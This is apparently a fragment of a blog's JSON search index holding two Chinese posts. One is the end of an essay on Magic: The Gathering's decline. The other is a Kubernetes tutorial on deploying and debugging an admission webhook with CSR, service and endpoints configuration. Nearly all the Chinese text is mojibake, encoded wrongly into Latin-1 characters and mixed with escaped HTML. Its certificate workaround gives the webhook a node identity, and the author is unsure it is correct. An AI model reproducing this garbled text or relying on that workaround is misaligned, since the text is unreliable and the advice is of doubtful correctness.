ä¸‡æ™ºç‰Œåœ¨å¾ˆå¤šç»´åº¦ä¸Šéƒ½æ¯”è¿‡å»æ¥è§¦è¿‡çš„æ‰€æœ‰å¡ç‰Œæ¸¸æˆæ›´æˆ³æˆ‘çš„xp.\u003c/p\u003e\n\u003cp\u003eå½“ç„¶, å®ƒå¹¶ä¸æ˜¯æ²¡æœ‰ç¼ºç‚¹çš„, è™½ç„¶ä¸»è¦çš„å‡ ä¸ªç¼ºç‚¹éƒ½ä¸æ˜¯å¡ç‰Œæœ¬èº«å¸¦æ¥çš„.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eæœ€å¤§çš„ç¼ºç‚¹å…¶å®åœ¨äºå¨ä¸–æ™ºçš„è¿è¥å¤ªåƒåœ¾äº†\n\u003cul\u003e\n\u003cli\u003eç¼ºä¹æ¨å¹¿, å›½å†…çš„æ¨å¹¿åŠ›åº¦ç›¸æ¯”è¾ƒå®å¯æ¢¦æ¥è¯´å‡ ä¹ä¸º0, æˆ‘ç›®å‰èƒ½çœ‹åˆ°çš„æœ€è¿‘çš„ä¸€æ¬¡æ¨å¹¿è¿˜æ˜¯åœ¨2021å¹´, æ‰¾çš„ç”šè‡³è¿˜æ˜¯åŠä½›è€Œä¸æ˜¯æ­£å„¿å…«ç»çš„æ˜æ˜Ÿ\u003c/li\u003e\n\u003cli\u003eå®˜æ–¹å¯¹æ°‘é—´èµ›äº‹çš„æŠµåˆ¶æ€åº¦è®©\u0026quot;ç§¯æç»„ç»‡-\u0026gt;ç§¯æé˜»æ­¢\u0026quot;æˆä¸ºå¤§é™†ä¸‡æ™ºç‰Œç©å®¶å£å£ç›¸ä¼ çš„é»‘å†å², å¤±å»äº†æ°‘å¿ƒ\u003c/li\u003e\n\u003cli\u003eå–æ¶ˆä¸­æ–‡çº¿ä¸ä»…å¦¨ç¢çš„æ–°äººå…¥å‘, ä¹Ÿè®©è€ç©å®¶å¯¹ä¹°å¡çš„æŠ•èµ„ä»·å€¼äº§ç”Ÿäº†æ€€ç–‘, ç»§è€Œæ¨åŠ¨è¿™ä¸¤ç±»äººå»æŠ•èµ„å…¶ä»–å‘å±•æ›´æœ‰å‰æ™¯çš„å¡ç‰Œ\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eä¸‡æ™ºç‰Œçš„å®šä»·, å››ç¾å…ƒåäº”æŠ½çš„å…¨çƒç»Ÿä¸€å®šä»·åœ¨ä¸‰åå¹´çš„ä¸‡æ™ºç‰Œå†å²ä¸­å°±æ²¡æœ‰å˜è¿‡, å¯å³ä¾¿åœ¨æ¶ˆè´¹æ°´å¹³è¿œèƒœè¿‡å»çš„ç°åœ¨, è¿™ä¸ªä»·æ ¼åœ¨å¤§éƒ¨åˆ†äºº, å°¤å…¶æ˜¯åœˆå¤–ç©å®¶çœ‹æ¥ä¾æ—§åé«˜, å†åŠ ä¸Šè‡³å°‘60ç‰Œçš„æ„ç­‘ä½“é‡å’ŒäºŒçº§å¸‚åœºäº¤æ˜“, è®©æˆå‹ä¸‡æ™ºå¥—ç‰Œçš„ä»·æ ¼æ™®éåœ¨500+, ä¸ä¹‹å½¢æˆé²œæ˜å¯¹æ¯”çš„, æ˜¯å®å¯æ¢¦å’Œæ¸¸æˆç‹ç­‰TCGåè¾ˆä»¬æ›´åŠ äº²æ°‘çš„ä»·æ ¼, è®©ä¸‡æ™ºç‰Œæ˜¾å¾—åƒæ˜¯ä¸€ä¸ªè·Ÿä¸ä¸Šæ—¶ä»£çš„è€äºº. å½“ç„¶äº†, å°±æˆ‘ä¸ªäººè€Œè¨€, ä¸‡æ™ºç‰Œçš„è®¾è®¡æ„Ÿå€¼å¾—è®©å®ƒçš„ä»·æ ¼æ¯”åˆ«çš„å¡ç‰Œè´µ, è™½ç„¶æˆ‘ä¸ä¼šä¹°\u003c/li\u003e\n\u003cli\u003eèƒŒæ™¯æ•…äº‹è´¨é‡ä¸é«˜. äººç±»æ˜¯ä¸€ä¸ªä»¥è®²æ•…äº‹èµ·å®¶çš„ç‰©ç§, äººç±»ç¤¾ä¼šä¹Ÿæ˜¯åœ¨é‡‘é’±æ”¿æ²»å›½å®¶å®—æ•™ç­‰ç§ç§æŠ½è±¡æ•…äº‹åŸºç¡€ä¸Šå»ºç«‹èµ·æ¥çš„, å¯ä»¥è¯´æ²¡æœ‰æ•…äº‹å°±æ²¡æœ‰ç¤¾ç¾¤. ä¸‡æ™ºç‰Œä¸æ˜¯æ²¡æœ‰æ•…äº‹, è€Œæ˜¯å®ƒçš„æ•…äº‹å¤ªè¿‡å•è–„ä¸”æ²¡æœ‰å¸å¼•äººçš„åœ°æ–¹, åœ¨è¿™ä¸ªæ•…äº‹éåœ°èµ°çš„å¹´ä»£, éšä¾¿ä¸€æœ¬ä¸»æµçš„å†’é™©å°è¯´éƒ½å¯ä»¥æ‹‰å‡ºæ¥åŠæ‰“å®ƒ, è€Œä¸å¤Ÿç²¾å½©çš„æ•…äº‹å°±æ³¨å®šæ— æ³•å¸å¼•æ³¨é‡æ•…äº‹çš„äºº\u003c/li\u003e\n\u003cli\u003eç¼ºä¹æ•…äº‹çš„ä¼ æ’­åª’ä»‹. å®¢è§‚æ¥è¯´, æ¸¸æˆç‹å’Œå®å¯æ¢¦çš„èƒŒæ™¯æ•…äº‹æ”¾åœ¨ç°åœ¨æ¥çœ‹åŒæ ·æ°´å¹³ä¸€èˆ¬, å‡å¦‚å¤§å®¶çš„æ•…äº‹å½¢å¼éƒ½åªæ˜¯å°è¯´, æˆ‘ç›¸ä¿¡ä¸‡æ™ºç‰Œåœ¨è®²æ•…äº‹è¿™æ–¹é¢æˆ–è®¸è¿˜æœ‰ä¸€æˆ˜ä¹‹åŠ›, ä½†æ˜¯æ¸¸æˆç‹å’Œå®å¯æ¢¦æœ‰äº†åŠ¨ç”», ç«äº‰çš„ç»´åº¦å°±å˜å¾—ä¸ä¸€æ ·äº†, åœ¨å¤„ç†å¾—å½“çš„æƒ…å†µä¸‹, è§†é¢‘å½±åƒä¼šå¤§å¹…åº¦æé«˜ä¸€ä¸ªæ•…äº‹æƒ…æ„Ÿæ¸²æŸ“çš„ä¸Šä¸‹é™, å³ä¾¿å‰§æƒ…å†æ€ä¹ˆç³Ÿç³•, äººä»¬ä¹Ÿä¼šå› ä¸ºé‚£ä¹ˆå‡ ä¸ªå°è±¡æ·±åˆ»çš„ç”»é¢è€Œè®°ä½è¿™ä¸ªIP, éšç€æ—¶é—´çš„æ¨ç§», åŠ¨ç”»å¸¦æ¥çš„ä¼ æ’­æ•ˆåº”ä¼šå‘ˆç°æ»šé›ªçƒå¼çš„å¢åŠ : è€ç©å®¶ä¼šå› ä¸ºè·å¾—æ»¤é•œåŠ æŒ, æ–°ç©å®¶åŒæ ·å¯ä»¥è½»æ¾å› ä¸ºç”»é¢è€Œå‘ç”Ÿå…±æƒ….\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eå‰©ä¸‹çš„æ¶‰åŠå¡ç‰Œå¹³è¡¡æ€§çš„ç¼ºç‚¹, è¿™ä¹Ÿå¼•å‘äº†æˆ‘å¯¹ä¼—å¤šTCGæ¸¸æˆçš„æ€è€ƒ, åŒ…æ‹¬æ¸¸æˆæ•´ä½“çš„ç”Ÿå‘½å‘¨æœŸä»¥åŠTCGæ¸¸æˆçš„æ„ä¹‰.\u003c/p\u003e\n\u003ch2 id=\"ç”Ÿå‘½å‘¨æœŸ\"\u003eç”Ÿå‘½å‘¨æœŸ\u003c/h2\u003e\n\u003ch3 id=\"å®ä½“è‹¦å„\"\u003eå®ä½“è‹¦å„\u003c/h3\u003e\n\u003cp\u003eçºµè§‚ä¼—å¤šTCG, ä¸‡æ™ºç‰Œå—é™äºåº•å±‚è´¹ç”¨æœºåˆ¶ä¼¼ä¹åœ¨è¿™æ–¹é¢ç›¸å¯¹æ¥è¯´åšå¾—å¥½ä¸€äº›, ç„¶è€Œé—®é¢˜åœ¨äº, ä½œä¸ºä¸€ä¸ªå•†ä¸šäº§å“, å®ƒçš„ç¬¬ä¸€ä»»åŠ¡æ˜¯ç»™å…¬å¸å¸¦æ¥è´¢å¯Œ, ç¬¬äºŒä»»åŠ¡æ‰æ˜¯æœåŠ¡äºç©å®¶, å°½ç®¡äºŒè€…åœ¨æœ‰äº›æ—¶å€™, å°¤å…¶æ˜¯æ¸¸æˆå‘å±•çš„æ—©æœŸæ˜¯ä¸å†²çªçš„. ä»ç©å®¶æ¥è¯´, \u003cstrong\u003eæ¸¸æˆæœ¬ä½“çš„è¿è¥å‘å±•å­˜åœ¨ä¸¤ä¸ªæ–¹å‘, ä¸€æ˜¯ç©æ³•çš„æ‰©å¼ , äºŒæ˜¯å¼ºåº¦çš„è¿­ä»£\u003c/strong\u003e, å‰è€…æ›´çµå·§æ›´å¾—äººå¿ƒ, åè€…åˆ™ç”±äºå¯¹å·²æœ‰å¡ç‰Œçš„æ·˜æ±°è€Œå¸¸å¸¸å¤‡å—äº‰è®®. ä¸€èˆ¬æ¥è¯´, æœ‰ç»éªŒçš„å¡ç‰Œè¿è¥å•†å¹¶ä¸ç€æ€¥äºå¼ºåº¦è¿­ä»£, è€Œæ˜¯ä¼˜å…ˆè‡´åŠ›äºç©æ³•çš„æ‰©å¼ , é—´æˆ–å¤¹æ‚å¿…è¦çš„å¼ºåº¦æå‡, å¯æƒœçš„æ˜¯, è¿‘ä¹å›ºåŒ–çš„åº•å±‚è§„åˆ™æ¡†æ¶å†³å®šäº†ç©æ³•çš„æ‰©å¼ æ˜¯æœ‰è¾¹é™…æ•ˆåº”çš„, \u003cstrong\u003eå½“æ‰©å¼ ç©æ³•çš„è¾¹é™…æ•ˆåº”å˜å¾—è¶Šæ¥è¶Šä½æ—¶, è¯´æ˜TCGçš„ç”Ÿå‘½å‘¨æœŸå·²ç»æ­¥å…¥äº†ååŠæ®µ\u003c/strong\u003e, ç„¶è€Œè¿™ä¸å•†ä¸šäº§å“çš„ç¬¬ä¸€ä½¿å‘½ç›¸äº’å†²çª, éšä¹‹è€Œæ¥çš„æ˜¯å¼ºåº¦çš„æ— é™æ‰©å¼ å’Œäº‰è®®çš„å‘ç”Ÿ, åœ¨æ²¡æœ‰æ–°ç©æ³•çš„æƒ…å†µä¸‹, å¯ä»¥é¢„è§çš„æ˜¯æ— æ­¢å¢ƒçš„å¼ºåº¦çˆ†ç‚¸. åœ¨è¿™ç‚¹ä¸Š, æ‰€æœ‰å•†ä¸šTCGéƒ½é¢ä¸´ç€åŒæ ·çš„é—®é¢˜: æœ‰é™çš„å¡ç‰Œç©æ³•å’Œæ— é™çš„å…¬å¸è´ªæ¬²ä¸ç©å®¶éœ€æ±‚å¼•å‘çš„ä¸»è¦çŸ›ç›¾.\u003c/p\u003e","title":"å¡ç‰Œè¿·æ€ï¼šä»ä¸‡æ™ºç‰Œçš„è¡°é€€å¼€å§‹"},{"content":"Deployment and Debugging of Admission Webhook in Kubernetes cluster Intro Dynamic admission control å…è®¸å¼€å‘è€…æ·»åŠ è‡ªå·±çš„é€»è¾‘ä»£ç æ¥å¯¹æäº¤ç»™API Serverçš„å¯¹è±¡è¿›è¡Œä¿®æ”¹å’ŒéªŒè¯, æ˜¯éå¸¸å¼ºå¤§çš„åŠŸèƒ½. æœ¬æ–‡å°†éƒ¨ç½²ä¸€ç»„demo admission webhook, åŒ…æ‹¬ä¸€ä¸ªvalidating webhook å’Œä¸€ä¸ª mutating webhook, å¹¶ä»‹ç»webhookçš„è°ƒè¯•æ–¹æ³•. æœ¬æ–‡ä¸»è¦ä½¿ç”¨å’Œå‚è€ƒäº†ä»0åˆ°1å¼€å‘K8S_Webhookæœ€ä½³å®è·µ, å¹¶é€šè¿‡æŸ¥é˜…å®˜æ–¹æ–‡æ¡£å¯¹å…¶ä¸­çš„ä¸€äº›ä¸é€‚åº”æ–°ç‰ˆæœ¬k8sçš„å†…å®¹è¿›è¡Œäº†ä¿®æ­£.\næœ¬æ–‡ä½¿ç”¨çš„é›†ç¾¤ç¯å¢ƒä¸ºKubernetes v1.25.16, ä½¿ç”¨minikubeåˆ›å»º. æˆ‘æ‰€åœ¨çš„æœºå™¨ä¸ºArch Linux. ä»£ç ä»“åº“ä¸º admission-webhook-exampleä¸­çš„v1éƒ¨åˆ†.\nåœ¨å¼€å§‹ä¹‹å‰, è¯·ç¡®ä¿é›†ç¾¤çš„API Serverå¼€å¯äº†MutatingAdmissionWebhookå’ŒValidatingAdmissionWebhook (ä¸€èˆ¬é»˜è®¤æƒ…å†µä¸‹éƒ½å¼€å¯äº†).\nDeployment åˆ›å»º service account åˆ›å»ºä¸€ä¸ªç”¨äºwebhookçš„service account\nkubectl apply -f deployment/rbac.yaml åˆ›å»ºè¯ä¹¦ API Serverè°ƒç”¨Webhookçš„è¿‡ç¨‹æ˜¯éœ€è¦HTTPSé€šä¿¡çš„(å…¶å®é›†ç¾¤å†…çš„é€šä¿¡å‡ ä¹éƒ½æ˜¯HTTPS), å› æ­¤éœ€è¦ä¸ºwebhookåˆ›å»ºè¯ä¹¦æ¥å¯¹webhookçš„serviceè¿›è¡ŒåŸŸåè®¤è¯. åŸåšå®¢ä½¿ç”¨çš„webhook-create-signed-cert.shå·²ç»è¿‡æ—¶, ä¸å†é€‚ç”¨äº1.25.16ç‰ˆæœ¬çš„é›†ç¾¤äº†, ä¸»è¦å‡ºé—®é¢˜çš„åœ°æ–¹å¦‚ä¸‹:\n# create server cert/key CSR and send to k8s API cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: certificates.k8s.io/v1beta1 kind: CertificateSigningRequest metadata: name: ${csrName} spec: groups: - system:authenticated request: $(cat ${tmpdir}/server.csr | base64 | tr -d \u0026#39;\\n\u0026#39;) usages: - digital signature - key encipherment - server auth EOF æ ¹æ®æ–‡æ¡£, åœ¨1.22ä»¥åŠä¹‹åç‰ˆæœ¬çš„kubernetesä¸­, certificates.k8s.io/v1beta1 å·²ç»è¢«æŠ›å¼ƒä¸å¯ç”¨, éœ€è¦ä¿®æ”¹ä¸ºcertificates.k8s.io/v1, å¹¶ä¸”éœ€è¦åœ¨specä¸­å¢åŠ signerName, signerçš„ä½œç”¨æ˜¯ç­¾ç½²è¯ä¹¦. k8så†…ç½®çš„signerName æœ‰ä»¥ä¸‹å‡ ç§:\nkubernetes.io/kube-apiserver-client: ç­¾åçš„è¯ä¹¦å°†è¢« API æœåŠ¡å™¨è§†ä¸ºå®¢æˆ·è¯ä¹¦. è®¸å¯çš„å¯†é’¥ç”¨é€”ä¸èƒ½åŒ…å« [\u0026quot;digital signature\u0026quot;, \u0026quot;key encipherment\u0026quot;, \u0026quot;client auth\u0026quot;] ä¹‹å¤–çš„é”®. kubernetes.io/kube-apiserver-client-kubelet: ç­¾åçš„è¯ä¹¦å°†è¢« kube-apiserver è§†ä¸ºå®¢æˆ·è¯ä¹¦. è®¸å¯çš„å¯†é’¥ç”¨é€”ä¸º[\u0026quot;key encipherment\u0026quot;, \u0026quot;digital signature\u0026quot;, \u0026quot;client auth\u0026quot;] æˆ– [\u0026quot;digital signature\u0026quot;, \u0026quot;client auth\u0026quot;] kubernetes.io/kubelet-serving: ç­¾åæœåŠ¡è¯ä¹¦ï¼Œè¯¥æœåŠ¡è¯ä¹¦è¢« API æœåŠ¡å™¨è§†ä¸ºæœ‰æ•ˆçš„ kubelet æœåŠ¡è¯ä¹¦. è®¸å¯çš„å¯†é’¥ç”¨é€”ä¸º[\u0026quot;key encipherment\u0026quot;, \u0026quot;digital signature\u0026quot;, \u0026quot;server auth\u0026quot;] æˆ– [\u0026quot;digital signature\u0026quot;, \u0026quot;server auth\u0026quot;] kubernetes.io/legacy-unknown: ä¸ä¿è¯ä¿¡ä»». é€šè¿‡åŸæ¥çš„è¯ä¹¦ç­¾åè¯·æ±‚çš„ç”¨é€”å¯ä»¥æ¨æ–­, æˆ‘ä»¬åº”è¯¥é€‰æ‹©kubernetes.io/kubelet-servingä½œä¸ºsigner, è€Œadmission webhookåœ¨éƒ¨ç½²åä¹Ÿç¡®å®ä¼šä½œä¸ºä¸€ç§æœåŠ¡è¢«API Serverè°ƒç”¨, å› æ­¤åœ¨è¿™ä¸ªè°ƒç”¨çš„è¿‡ç¨‹ä¸­, API Serveræ˜¯å®¢æˆ·ç«¯, è€Œwebhookæ˜¯æœåŠ¡ç«¯, éœ€è¦ä¸€ä¸ªæœåŠ¡è¯ä¹¦.\nå› æ­¤ç»è¿‡ä¿®æ”¹, webhook-create-signed-cert.shè„šæœ¬ä¸­ç›¸åº”éƒ¨åˆ†åº”è¯¥æ›´æ”¹ä¸ºå¦‚ä¸‹å†…å®¹:\n# create server cert/key CSR and send to k8s API cat \u0026lt;\u0026lt;EOF | kubectl create -f - apiVersion: certificates.k8s.io/v1 kind: CertificateSigningRequest metadata: name: ${csrName} spec: signerName: kubernetes.io/kubelet-serving groups: - system:authenticated request: $(cat ${tmpdir}/server.csr | base64 | tr -d \u0026#39;\\n\u0026#39;) usages: - digital signature - key encipherment - server auth EOF ä½†æ˜¯è¿™è¿˜æ²¡å®Œ, åœ¨æ‰§è¡Œè„šæœ¬å, æˆ‘ä»¬ä¼šå‘ç°è¯ä¹¦è¯·æ±‚è™½ç„¶é€šè¿‡äº†, ä½†æ˜¯è¯ä¹¦å¹¶æ²¡æœ‰ç­¾å‘, åŸå› å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤å»æŸ¥é˜…:\nkubectl get csr \u0026lt;csr-name\u0026gt; -o yaml åœ¨è¾“å‡ºä¸­çš„statuså¯ä»¥å‘ç°é”™è¯¯åŸå› , ç»è¿‡æŸ¥é˜…, å¯ä»¥ä»å®˜æ–¹æ–‡æ¡£å’Œç›¸å…³çš„github issueä¸­å‘ç°æ˜¯csråˆ›å»ºæ—¶å€™å¡«çš„å†…å®¹æœ‰é—®é¢˜, è„šæœ¬åœ¨åˆ›å»ºcsrçš„æ—¶å€™ä½¿ç”¨çš„å‘½ä»¤æ˜¯:\nopenssl genrsa -out ${tmpdir}/server-key.pem 2048 openssl req -new -key ${tmpdir}/server-key.pem -subj \u0026#34;/CN=${service}.${namespace}.svc\u0026#34; -out ${tmpdir}/server.csr -config ${tmpdir}/csr.conf ä½†æ˜¯æ–‡æ¡£ä¸­æåˆ°, kubernetes.io/kubelet-servingç­¾åè€…è§„å®š, è®¸å¯çš„ä¸»ä½“ç»„ç»‡åå¿…é¡»æ˜¯ [\u0026quot;system:nodes\u0026quot;], ç”¨æˆ·åå¿…é¡»ä»¥ system:node: å¼€å¤´, é‚£ä¹ˆç»è¿‡ç•¥å¾®ä¿®æ”¹, æ­£ç¡®çš„å‘½ä»¤å¦‚ä¸‹:\nopenssl genrsa -out ${tmpdir}/server-key.pem 2048 openssl req -new -key ${tmpdir}/server-key.pem -subj \u0026#34;/CN=system:node:${service}.${namespace}.svc/O=system:nodes\u0026#34; -out ${tmpdir}/server.csr -config ${tmpdir}/csr.conf (è¿™ä¸ªCNçš„åå­—æˆ‘ä¸çŸ¥é“è¿™ä¹ˆæ”¹è¡Œä¸è¡Œ, åæ­£ä¸å½±å“åç»­çš„æ“ä½œ\u0026hellip;)\né‡æ–°æ‰§è¡Œè„šæœ¬å°±å¯ä»¥äº†, å¯ä»¥é€šè¿‡kubectl get csr \u0026lt;csr-name\u0026gt; çœ‹åˆ°è¯ä¹¦å·²ç»Issueäº†.\nåˆ›å»ºService æœ‰äº†è¯ä¹¦è‡ªç„¶è¦æœ‰ç›¸åº”çš„åŸŸåå’ŒæœåŠ¡, åœ¨é›†ç¾¤å†…éƒ¨, è¿™æ ·çš„æœåŠ¡å°±é€šè¿‡Serviceèµ„æºæ¥åˆ›å»º. ç„¶åéƒ¨ç½²ç›¸åº”çš„Deployment\nkubectl apply -f deployment/service.yaml kubectl apply -f deployment/deployment.yaml è¿™ä¸ªDeploymentä¸­åŒ…å«äº†ValidatingAdmissionWebhookå’ŒMutatingAdmissionWebhookçš„ä»£ç , ä»–ä»¬é€šè¿‡ä¸åŒçš„è·¯ç”±å¾—åˆ°è§¦å‘.\n// main.go mux := http.NewServeMux() mux.HandleFunc(\u0026#34;/mutate\u0026#34;, whsvr.serve) mux.HandleFunc(\u0026#34;/validate\u0026#34;, whsvr.serve) whsvr.server.Handler = mux æ³¨å†ŒValidatingAdmissionWebhook æ‰§è¡Œwebhook-patch-ca-bundle.shæ¥å¯¹validatingwebhook.yamlè¿›è¡Œpatch, æ›¿æ¢å…¶ä¸­çš„${CA_BUNDLE}å˜é‡, è§‚å¯Ÿè¿™ä¸ªæ¨¡æ¿æ–‡ä»¶, å¯ä»¥å‘ç°ä»–æ³¨å†Œçš„æ˜¯ admission-webhook-example-svc çš„ /validate è·¯ç”±, å¹¶ä¸“é—¨åœ¨deploymentså’Œservicesèµ„æºçš„åˆ›å»ºçš„æ—¶å€™å¯¹åˆ›å»ºè¡Œä¸ºè¿›è¡ŒéªŒè¯, æ­¤å¤–, matchLabels éƒ¨åˆ†è§„å®šäº†åªæœ‰namespaceæœ‰admission-webhook-example: enabled è¿™æ ·çš„labelçš„æ—¶å€™, è¿™ä¸ªwebhookæ‰ä¼šè¢«è¿™ä¸ªnamespaceä¸­çš„è¡Œä¸ºè§¦å‘.\napiVersion: admissionregistration.k8s.io/v1beta1 kind: ValidatingWebhookConfiguration metadata: name: validation-webhook-example-cfg labels: app: admission-webhook-example webhooks: - name: required-labels.qikqiak.com clientConfig: service: name: admission-webhook-example-svc namespace: default path: \u0026#34;/validate\u0026#34; caBundle: ${CA_BUNDLE} rules: - operations: [\u0026#34;CREATE\u0026#34;] apiGroups: [\u0026#34;apps\u0026#34;, \u0026#34;\u0026#34;] apiVersions: [\u0026#34;v1\u0026#34;] resources: [\u0026#34;deployments\u0026#34;, \u0026#34;services\u0026#34;] namespaceSelector: matchLabels: admission-webhook-example: enabled æˆ‘å¯¹è¿™ä¸ªcaBundleæœ‰ç‚¹å¥½å¥‡, æŸ¥äº†æŸ¥, è¿™ä¸ªcaBundleæ˜¯ç”¨äºæ ¡éªŒ Webhook çš„æœåŠ¡å™¨è¯ä¹¦, ç±»ä¼¼äºè®¿é—®ç½‘ç«™æ—¶å€™çš„ä¿¡ä»»æ ¹è¯ä¹¦.\néªŒè¯ å¦‚ä¸Šæ‰€è¯´, ç»™defaultæ·»åŠ label\nkubectl label namespace default admission-webhook-example=enabled ç„¶åéƒ¨ç½²æµ‹è¯•ç”¨ä¾‹sleep.yaml, ä¼šå‘ç°éƒ¨ç½²å¤±è´¥äº†, å› ä¸ºæ²¡æœ‰éœ€è¦çš„labels, è¿™éƒ¨åˆ†é€»è¾‘å¯ä»¥å»ç¿»ç¿»webhook.goä¸­çš„ä»£ç , è¯´æ˜webhookç¡®å®å¤„ç†äº†èµ„æºåˆ›å»ºè¯·æ±‚.\næ¥ç€, ç”¨sleep-no-validation.yaml æ‰§è¡Œåˆ›å»ºæ“ä½œæˆåŠŸ, å› ä¸ºè®¾ç½®äº†ä¸€ä¸ªadmission-webhook-example.qikqiak.com/validate: \u0026quot;false\u0026quot; å‘Šè¯‰webhookä¸è¦éªŒè¯ . sleep-with-labels.yamlä¹Ÿå¯ä»¥åˆ›å»ºæˆåŠŸ, åŸå› æ˜¯åŠ ä¸Šäº†å¯¹åº”çš„æ ‡ç­¾.\næ³¨å†ŒMutatingAdmissionWebhook å’Œæ³¨å†ŒValidatingAdmissionWebhookç±»ä¼¼, è¿™é‡Œçœç•¥\nDebugging Debugging webhookçš„æ€è·¯æ˜¯è¿™æ ·çš„: åœ¨æœ¬åœ°æ–¹ä¾¿è°ƒè¯•çš„ç¯å¢ƒä¸­è·‘webhookçš„golangä»£ç , ç„¶åå°†è¿™ä¸ªwebhookæœåŠ¡æ³¨å†Œä¸ºé›†ç¾¤å†…çš„ä¸€ä¸ªå¤–éƒ¨Endpoints.\nåœ¨ä¸‹é¢çš„æ“ä½œä¹‹å‰, å…ˆæŒ‰ç…§ç±»ä¼¼çš„æ­¥éª¤ä½¿ç”¨debugæ–‡ä»¶ä¸‹çš„yamlæ–‡ä»¶æ‰§è¡Œå’Œéƒ¨ç½²æ—¶ç›¸åŒçš„æ“ä½œ. (æ³¨æ„, debug/webhook-create-signed-cert.shæœ€åå‡ è¡Œå¯¼å‡ºè¯ä¹¦çš„æ­¥éª¤å¯ä»¥æ³¨é‡Šæ‰æ¥è‡ªå·±æ‰‹åŠ¨å¯¼å‡º)\nè¿è¡Œ å‰é¢æè¿‡, webhookè¢«è°ƒç”¨éœ€è¦å®ƒæœ‰æœåŠ¡ç«¯çš„è¯ä¹¦, å› æ­¤æˆ‘ä»¬å°†æœåŠ¡ç«¯çš„è¯ä¹¦å¯¼å‡ºæ¥, å¹¶ä¿®æ”¹main.goä¸­è¯ä¹¦çš„è·¯ç», è¿™é‡Œæˆ‘å°†cert.pemå’Œkey.peméƒ½æ”¾åœ¨äº†ä¸ä»£ç ç›¸åŒçš„ç›®å½•ä¸‹é¢\nkubectl get secret ${secret} -o json | jq -r \u0026#39;.data.\u0026#34;key.pem\u0026#34;\u0026#39; | base64 -d \u0026gt; key.pem kubectl get secret ${secret} -o json | jq -r \u0026#39;.data.\u0026#34;cert.pem\u0026#34;\u0026#39; | base64 -d \u0026gt; cert.pem flag.IntVar(\u0026amp;parameters.port, \u0026#34;port\u0026#34;, 443, \u0026#34;Webhook server port.\u0026#34;) // flag.StringVar(\u0026amp;parameters.certFile, \u0026#34;tlsCertFile\u0026#34;, \u0026#34;/etc/webhook/certs/cert.pem\u0026#34;, \u0026#34;File containing the x509 Certificate for HTTPS.\u0026#34;) // flag.StringVar(\u0026amp;parameters.keyFile, \u0026#34;tlsKeyFile\u0026#34;, \u0026#34;/etc/webhook/certs/key.pem\u0026#34;, \u0026#34;File containing the x509 private key to --tlsCertFile.\u0026#34;) flag.StringVar(\u0026amp;parameters.certFile, \u0026#34;tlsCertFile\u0026#34;, \u0026#34;cert.pem\u0026#34;, \u0026#34;File containing the x509 Certificate for HTTPS.\u0026#34;) flag.StringVar(\u0026amp;parameters.keyFile, \u0026#34;tlsKeyFile\u0026#34;, \u0026#34;key.pem\u0026#34;, \u0026#34;File containing the x509 private key to --tlsCertFile.\u0026#34;) ç›´æ¥go run .è¿è¡Œå³å¯, è®°å¾—ç»™ä¸€ä¸‹æƒé™.\næ³¨å†Œ æ‰“å¼€debug/service.yaml, å†…å®¹å¦‚ä¸‹:\napiVersion: v1 kind: Service metadata: name: admission-webhook-example-svc-debug spec: ports: - port: 443 targetPort: 443 --- apiVersion: v1 kind: Endpoints metadata: name: admission-webhook-example-svc-debug subsets: - addresses: - ip: 192.168.58.1 ports: - port: 443 å¯ä»¥çœ‹åˆ°è¿™é‡Œæ‰‹åŠ¨åˆ›å»ºäº†ä¸€ä¸ªendpointsæ¥æŒ‡å‘å¤–éƒ¨(è¿™é‡Œæ˜¯æˆ‘çš„å®¿ä¸»æœº)çš„admission-webhookæœåŠ¡, å¹¶ä¸”ä¾æ—§ä½¿ç”¨Serviceèµ„æºæ¥æ¥æ”¶API Serverçš„è°ƒç”¨è¯·æ±‚, API Serverçš„è°ƒç”¨è¯·æ±‚ä¼šå‘é€ç»™serviceçš„443ç«¯å£, serviceéšå³å°†è¯·æ±‚å‘é€ç»™endpointsçš„443ç«¯å£, ä¹Ÿå°±æ˜¯è·‘åœ¨å®¿ä¸»æœºä¸Šçš„webhookæœåŠ¡. è¯»è€…è‡ªå·±æ“ä½œçš„æ—¶å€™è¦è®°å¾—å°†192.168.58.1æ›¿æ¢ä¸ºè‡ªå·±webhookæœåŠ¡æ‰€åœ¨çš„å®¿ä¸»æœºçš„å¯¹åº”ip.\nç„¶åå°è¯•éƒ¨ç½²sleep.yaml, ä¼šå‘ç°webhookè¿™è¾¹æœ‰ç›¸åº”çš„è¾“å‡ºäº†.\nåˆ°æ­¤ä¸ºæ­¢, æˆ‘ä»¬å·²ç»å¯ä»¥åœ¨è‡ªå·±çš„æœ¬åœ°ç¯å¢ƒä¸­è¿è¡Œadmission-webhookå¹¶è®©é›†ç¾¤æ¥è°ƒç”¨å®ƒäº†, å¦‚ä½•Debug? æ‰“å¼€vscodeä¸‹æ–­ç‚¹è¿è¡Œå°±å¥½äº†\næœ€åä¸€ç‚¹, éå¸¸æ¨èvscodeçš„kubernetesæ’ä»¶, å¯¹äºå¼€å‘äººå‘˜æŸ¥çœ‹é›†ç¾¤ä¿¡æ¯å’Œæ—¥å¿—éƒ½æœ‰å¾ˆå¤§å¸®åŠ©, ä¸å†éœ€è¦ç–¯ç‹‚æ•²kubectl logs å‘½ä»¤äº†.\næ€»ç»“ è¿™æ¬¡å®è·µä¸‹æ¥, å‘ç°é™ä¸‹å¿ƒæ¥é˜…è¯»å®˜æ–¹æ–‡æ¡£çœŸçš„æ˜¯éå¸¸é‡è¦çš„èƒ½åŠ›, ä¸è¦è¿‡åº¦ä¾èµ–chatgpt, åè€…åœ¨æˆ‘çº æ­£è¯ä¹¦é”™è¯¯æœŸé—´ä¸€ç›´è®©æˆ‘æŠŠsignerNameå†™æˆ kubernetes.io/apiserver-serving è¿™ä¸ªä¸çŸ¥é“æ˜¯ä»€ä¹ˆçš„ä¸œè¥¿, è®©æˆ‘ç™½ç™½æµªè´¹äº†å¾ˆä¹…çš„æ—¶é—´, ç›´åˆ°æˆ‘æ…¢æ…¢è¯»å®˜æ–¹æ–‡æ¡£æ‰å‘ç°è¿™ä¸ªé”™è¯¯.\næ‰€ä»¥é™ä¸‹å¿ƒæ¥å»é˜…è¯»é‚£äº›çœ‹èµ·æ¥å¾ˆéš¾çš„ä¸œè¥¿, 